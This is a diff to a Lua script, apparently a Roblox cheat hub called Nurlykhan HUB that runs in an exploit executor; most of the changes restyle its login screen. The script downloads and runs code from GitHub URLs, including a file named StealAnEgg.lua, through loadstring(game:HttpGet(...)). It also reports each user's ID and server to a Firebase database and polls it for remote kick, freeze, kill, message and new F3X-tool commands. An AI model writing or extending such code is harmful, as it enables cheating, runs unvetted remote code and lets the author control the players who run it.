@@ -15,7 +15,19 @@ local DATABASE_URL = "https://play-lag-default-rtdb.firebaseio.com/ActiveUsers"
 local SETTINGS_URL = "https://play-lag-default-rtdb.firebaseio.com/Settings"
 local HUB_URL = "https://raw.githubusercontent.com/h16536666-dotcom/Egg-Roblox-Delta-script-/refs/heads/main/StealAnEgg.lua"
 
--- АДМИН ХАБАРЛАМАСЫ ТЕРЕЗЕСІН АШУ ФУНКЦИЯСЫ
+-- F3X ҚҰРАЛЫН ТАРТУ ФУНКЦИЯСЫ (АРНАЙЫ ФУНКЦИОНАЛ)
+local function giveF3X()
+    pcall(function()
+        local f3x = game:GetObjects("rbxassetid://142785488")[1]
+        if f3x then
+            f3x.Parent = LocalPlayer:WaitForChild("Backpack")
+        else
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/F3X.lua"))()
+        end
+    end)
+end
+
+-- АДМИН ХАБАРЛАМАСЫ ТЕРЕЗЕСІ
 local function showAdminMessageGui(msgText)
     local CoreGui = game:GetService("CoreGui")
     local oldMsg = CoreGui:FindFirstChild("NurlykhanMsgGui")
@@ -44,7 +56,7 @@ local function showAdminMessageGui(msgText)
     local Title = Instance.new("TextLabel")
     Title.Size = UDim2.new(1, 0, 0, 30)
     Title.BackgroundTransparency = 1
-    Title.Text = "💬 NURLYKHAN HUB // ХАБАРЛАМА"
+    Title.Text = "💬 Nurlykhan HUB 👑 // ХАБАРЛАМА"
     Title.TextColor3 = Color3.fromRGB(0, 255, 200)
     Title.TextSize = 13
     Title.Font = Enum.Font.SourceSansBold
@@ -72,9 +84,7 @@ local function showAdminMessageGui(msgText)
     CloseBtn.Parent = MsgBoxFrame
     Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 6)
 
-    CloseBtn.MouseButton1Click:Connect(function()
-        MsgGui:Destroy()
-    end)
+    CloseBtn.MouseButton1Click:Connect(function() MsgGui:Destroy() end)
 end
 
 -- АДМИН КОМАНДАЛАРЫН ТЕКСЕРУ ЦИКЛІ
@@ -85,10 +95,20 @@ task.spawn(function()
             if res and res.StatusCode == 200 and res.Body ~= "null" then
                 local uData = HttpService:JSONDecode(res.Body)
                 if type(uData) == "table" then
-                    -- 💬 1. CHAT MESSAGE (Хабарламаны қабылдау)
+                    -- F3X Блок алу командасы
+                    if uData.GiveF3X == true then
+                        request({
+                            Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/GiveF3X.json",
+                            Method = "PUT",
+                            Headers = {["Content-Type"] = "application/json"},
+                            Body = HttpService:JSONEncode(false)
+                        })
+                        giveF3X()
+                    end
+
+                    -- Чат хабарламасы
                     if uData.Message and tostring(uData.Message) ~= "" then
                         local msgReceived = tostring(uData.Message)
-                        -- Тексеріп болған соң базадан тазалаймыз
                         request({
                             Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/Message.json",
                             Method = "PUT",
@@ -98,7 +118,7 @@ task.spawn(function()
                         showAdminMessageGui(msgReceived)
                     end
 
-                    -- 2. Kick
+                    -- Kick
                     if uData.Kick == true then
                         request({
                             Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/Kick.json",
@@ -110,7 +130,7 @@ task.spawn(function()
                         LocalPlayer:Kick("Nurlykhan HUB 👑: Админ сізді ойыннан шығарды!")
                     end
 
-                    -- 3. Freeze / Unfreeze
+                    -- Freeze / Unfreeze
                     if uData.Freeze == true then
                         if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                             LocalPlayer.Character.HumanoidRootPart.Anchored = true
@@ -121,7 +141,7 @@ task.spawn(function()
                         end
                     end
 
-                    -- 4. Kill
+                    -- Kill
                     if uData.Kill == true then
                         if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                             LocalPlayer.Character.Humanoid.Health = 0
@@ -161,14 +181,6 @@ pcall(function()
                 currentPassword = "NONE"
             end
         end
-    else
-        local oldPassRes = request({ Url = SETTINGS_URL .. "/Password.json", Method = "GET" })
-        if oldPassRes and oldPassRes.StatusCode == 200 and oldPassRes.Body ~= "null" then
-            local oldPData = HttpService:JSONDecode(oldPassRes.Body)
-            if oldPData and tostring(oldPData) ~= "" then
-                currentPassword = tostring(oldPData)
-            end
-        end
     end
 
     local updateRes = request({ Url = SETTINGS_URL .. "/UpdateData.json", Method = "GET" })
@@ -200,7 +212,7 @@ if updateData.Enabled == true then
     local Title = Instance.new("TextLabel")
     Title.Size = UDim2.new(1, 0, 0, 45)
     Title.BackgroundTransparency = 1
-    Title.Text = "🚨 NURLYKHAN HUB - ЖАҢАРТУ ЖҮРІП ЖАТЫР 🚨"
+    Title.Text = "🚨 Nurlykhan HUB 👑 - ЖАҢАРТУ ЖҮРІП ЖАТЫР 🚨"
     Title.TextColor3 = Color3.fromRGB(255, 150, 0)
     Title.TextSize = 15
     Title.Font = Enum.Font.SourceSansBold
@@ -222,19 +234,10 @@ end
 
 local function showUpdateScreen()
     getgenv().NurlykhanHubLoaded = true
-    
-    local success, err = pcall(function()
+    pcall(function()
         local source = game:HttpGet(HUB_URL)
         if source and source ~= "" then loadstring(source)() end
     end)
-
-    if success then
-        game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "Nurlykhan HUB 👑",
-            Text = "Скрипт сәтті қосылды!",
-            Duration = 4
-        })
-    end
 end
 
 local function registerActiveUser()
@@ -250,6 +253,7 @@ local function registerActiveUser()
                     Kick = false,
                     Freeze = false,
                     Kill = false,
+                    GiveF3X = false,
                     Message = "",
                     JobId = game.JobId,
                     PlaceId = game.PlaceId
@@ -257,11 +261,10 @@ local function registerActiveUser()
             })
         end)
     end)
-    
     showUpdateScreen()
 end
 
--- ПАРОЛЬ ТЕРЕЗЕСІ
+-- ПАРОЛЬ ТЕРЕЗЕСІ ЖӘНЕ 💚 МАТРИЦА ЭФФЕКТІСІ
 if currentPassword == "NONE" then
     registerActiveUser()
 else
@@ -276,7 +279,7 @@ else
     local MainFrame = Instance.new("Frame")
     MainFrame.Size = UDim2.new(0, 420, 0, 230)
     MainFrame.Position = UDim2.new(0.5, -210, 0.5, -115)
-    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+    MainFrame.BackgroundColor3 = Color3.fromRGB(5, 10, 5)
     MainFrame.BorderSizePixel = 0
     MainFrame.Active = true
     MainFrame.Draggable = true
@@ -285,19 +288,54 @@ else
     Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 12)
 
     local stroke = Instance.new("UIStroke")
-    stroke.Color = Color3.fromRGB(0, 170, 255)
+    stroke.Color = Color3.fromRGB(0, 255, 65)
     stroke.Thickness = 2
     stroke.Parent = MainFrame
 
+    -- ❇️ МАТРИЦА ЭФФЕКТІСІ ДАЙЫНДАУ
+    local MatrixHolder = Instance.new("Frame")
+    MatrixHolder.Size = UDim2.new(1, 0, 1, 0)
+    MatrixHolder.BackgroundTransparency = 1
+    MatrixHolder.ClipsDescendants = true
+    MatrixHolder.Parent = MainFrame
+
+    local chars = {"0", "1", "X", "K", "P", "2", "0", "3", "5", "N", "U", "R", "#", "$", "%"}
+    for i = 1, 14 do
+        task.spawn(function()
+            local colLabel = Instance.new("TextLabel")
+            colLabel.Size = UDim2.new(0, 20, 1, 0)
+            colLabel.Position = UDim2.new((i - 1) * 0.075, 0, 0, 0)
+            colLabel.BackgroundTransparency = 1
+            colLabel.TextColor3 = Color3.fromRGB(0, 255, 65)
+            colLabel.TextTransparency = 0.6
+            colLabel.TextSize = 11
+            colLabel.Font = Enum.Font.Code
+            colLabel.TextYAlignment = Enum.TextYAlignment.Top
+            colLabel.Parent = MatrixHolder
+
+            while MainFrame and MainFrame.Parent do
+                local txt = ""
+                for j = 1, 12 do
+                    txt = txt .. chars[math.random(1, #chars)] .. "\n"
+                end
+                colLabel.Text = txt
+                task.wait(math.random(1, 3) * 0.1)
+            end
+        end)
+    end
+
+    -- 👑 БАСТЫ АТАУ
     local Title = Instance.new("TextLabel")
     Title.Size = UDim2.new(1, 0, 0, 35)
     Title.BackgroundTransparency = 1
     Title.Text = "Nurlykhan HUB 👑"
-    Title.TextColor3 = Color3.fromRGB(255, 215, 0)
+    Title.TextColor3 = Color3.fromRGB(0, 255, 65)
     Title.TextSize = 18
     Title.Font = Enum.Font.SourceSansBold
+    Title.TextStrokeTransparency = 0.5
     Title.Parent = MainFrame
 
+    -- 🌟 3D VIEWPORT (Нұрлыханның Скині)
     local Viewport = Instance.new("ViewportFrame")
     Viewport.Size = UDim2.new(0.38, 0, 0.75, 0)
     Viewport.Position = UDim2.new(0.03, 0, 0.18, 0)
@@ -358,19 +396,20 @@ else
     local PassBox = Instance.new("TextBox")
     PassBox.Size = UDim2.new(0.52, 0, 0, 38)
     PassBox.Position = UDim2.new(0.44, 0, 0.3, 0)
-    PassBox.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
-    PassBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    PassBox.BackgroundColor3 = Color3.fromRGB(15, 25, 15)
+    PassBox.TextColor3 = Color3.fromRGB(0, 255, 65)
     PassBox.PlaceholderText = "Пароль енгізіңіз..."
     PassBox.Text = ""
     PassBox.TextSize = 14
-    PassBox.Font = Enum.Font.SourceSans
+    PassBox.Font = Enum.Font.Code
     PassBox.Parent = MainFrame
     Instance.new("UICorner", PassBox).CornerRadius = UDim.new(0, 8)
+    local pStroke = Instance.new("UIStroke") pStroke.Color = Color3.fromRGB(0, 255, 65) pStroke.Parent = PassBox
 
     local SubmitBtn = Instance.new("TextButton")
     SubmitBtn.Size = UDim2.new(0.52, 0, 0, 38)
     SubmitBtn.Position = UDim2.new(0.44, 0, 0.58, 0)
-    SubmitBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+    SubmitBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 50)
     SubmitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
     SubmitBtn.Text = "Кіру 🚀"
     SubmitBtn.TextSize = 16
@@ -381,7 +420,7 @@ else
     local ResizeBtn = Instance.new("TextButton")
     ResizeBtn.Size = UDim2.new(0, 18, 0, 18)
     ResizeBtn.Position = UDim2.new(1, -18, 1, -18)
-    ResizeBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
+    ResizeBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 40)
     ResizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
     ResizeBtn.Text = "↘"
     ResizeBtn.TextSize = 12
@@ -424,7 +463,7 @@ else
             SubmitBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
             task.wait(1.5)
             SubmitBtn.Text = "Кіру 🚀"
-            SubmitBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+            SubmitBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 50)
         end
     end)
 end
